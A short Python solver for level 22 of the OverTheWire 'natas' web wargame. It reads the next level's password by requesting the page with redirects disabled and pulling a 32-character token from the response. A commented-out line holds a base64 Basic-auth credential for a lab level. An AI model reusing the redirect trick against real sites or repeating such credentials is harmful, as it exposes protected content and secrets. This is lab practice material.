import requests
import re
from requests.auth import HTTPBasicAuth
def solve22(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    #session.headers["Authorization"] = "Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg=="
    resp = session.get("http://natas22.natas.labs.overthewire.org/index.php?revelio=", allow_redirects=False)
    pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
    return pw
